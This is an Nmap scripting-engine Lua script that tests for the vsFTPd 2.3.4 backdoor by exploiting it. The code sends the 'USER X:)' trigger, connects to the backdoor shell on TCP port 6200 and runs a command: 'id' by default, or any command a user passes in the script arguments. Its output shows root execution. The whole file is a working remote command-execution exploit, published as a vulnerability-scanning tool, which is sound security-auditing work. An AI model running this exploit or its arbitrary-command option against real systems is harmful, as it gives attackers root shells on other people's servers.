description = [[
Tests for the presence of the vsFTPd 2.3.4 backdoor reported on 2011-07-04. This
script attempts to exploit the backdoor using the innocuous <code>id</code>
command by default, but that can be changed with the
<code>exploit.cmd</code> or <code>ftp-vsftpd-backdoor.cmd</code> script
arguments.

References:
 * http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
 * https://dev.metasploit.com/redmine/projects/framework/repository/revisions/13093
]]

---
-- @usage
-- nmap --script ftp-vsftpd-backdoor -p 21 <host>
--
-- @args exploit.cmd or ftp-vsftpd-backdoor.cmd Command to execute in shell
--       (default is <code>id</code>).
--
-- @output
-- PORT   STATE SERVICE
-- 21/tcp open  ftp
-- | ftp-vsftpd-backdoor:
-- |   This installation has been backdoored: VULNERABLE
-- |     Shell command: id
-- |_    Results: uid=0(root) gid=0(root) groups=0(root)

author = "Daniel Miller"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"discovery", "intrusive"}

require("ftp")
require("nmap")
require("shortport")
require("stdnse")

local CMD_FTP = "USER X:)\r\nPASS X\r\n"
local CMD_SHELL_ID = "id"

portrule = function (host, port)
  -- Check if version detection knows what FTP server this is.
  if port.version.product ~= nil and port.version.product ~= "vsftpd" then
    return false
  end

  -- Check if version detection knows what version of FTP server this is.
  if port.version.version ~= nil and port.version.version ~= "2.3.4" then
    return false
  end

  return shortport.port_or_service(21, "ftp")(host, port)
end

local function finish_ftp(socket, status, message)
  if socket then
    socket:close()
  end
  return status, message
end

-- Returns true, results  if vsFTPd was backdoored
local function check_backdoor(host, shell_cmd)
  local socket = nmap.new_socket("tcp")
  socket:set_timeout(10000)
  
  local status, ret = socket:connect(host, 6200, "tcp")
  if not status then
    return finish_ftp(socket, false,
            string.format("can't connect to tcp port 6200: NOT VULNERABLE ",
                          ret))
  end

  status, ret = socket:send(CMD_SHELL_ID.."\n")
  if not status then
    return finish_ftp(socket, false, "failed to send shell command")
  end

  status, ret = socket:receive_lines(1)
  if not status then
    return finish_ftp(socket, false,
              string.format("failed to read shell command results: %s",
                            ret))
  end

  if not ret:match("uid=") then
    return finish_ftp(socket, false,
          "service on port 6200 is not the vsFTPd backdoor: NOT VULNERABLE")
  else
    if shell_cmd ~= CMD_SHELL_ID then
      status, ret = socket:send(shell_cmd.."\n")
      if not status then
        return finish_ftp(socket, false, "failed to send shell command")
      end
      status, ret = socket:receive_lines(1)
      if not status then
        return finish_ftp(socket, false,
                  string.format("failed to read shell commands results: %s",
                                ret))
      end
    end
  end

  return finish_ftp(socket, true, string.gsub(ret, "^%s*(.-)\n*$", "%1"))
end

action = function(host, port)
  -- Get script arguments.
  local cmd = stdnse.get_script_args("ftp-vsftpd-backdoor.cmd") or
                stdnse.get_script_args("exploit.cmd") or CMD_SHELL_ID

  local results = {
    "This installation has been backdoored: VULNERABLE",
    "  Shell command: " .. cmd,
  }

  -- check to see if the vsFTPd backdoor was already triggered
  local status, ret = check_backdoor(host, cmd)
  if status then
    table.insert(results, 2, "The backdoor was already triggered")
    table.insert(results, string.format("  Results: %s", ret))
    return stdnse.format_output(true, results)
  end

  -- Create socket.
  local sock, err = ftp.connect(host, port,
                                {recv_before = false,
                                timeout = 8000})
  if not sock then
    stdnse.print_debug(1, "%s: can't connect: %s",
                          SCRIPT_NAME, err)
    return nil
  end

  -- Read banner.
  local buffer = stdnse.make_buffer(sock, "\r?\n")
  local code, message = ftp.read_reply(buffer)
  if not code then
    stdnse.print_debug(1, "%s: can't read banner: %s",
                          SCRIPT_NAME, message)
    sock:close()
    return nil
  end

  status, ret = sock:send(CMD_FTP .. "\r\n")
  if not status then
    stdnse.print_debug(1, "%s: failed to send privilege escalation command: %s",
                          SCRIPT_NAME, ret)
    return nil
  end

  stdnse.sleep(1)
  -- check if vsFTPd was backdoored
  status, ret = check_backdoor(host, cmd)
  if not status then
    stdnse.print_debug(1, "%s: %s", SCRIPT_NAME, ret)
    return nil
  end

  -- delay ftp socket cleaning
  sock:close()
  table.insert(results, string.format("  Results: %s", ret))
  return stdnse.format_output(true, results)
end
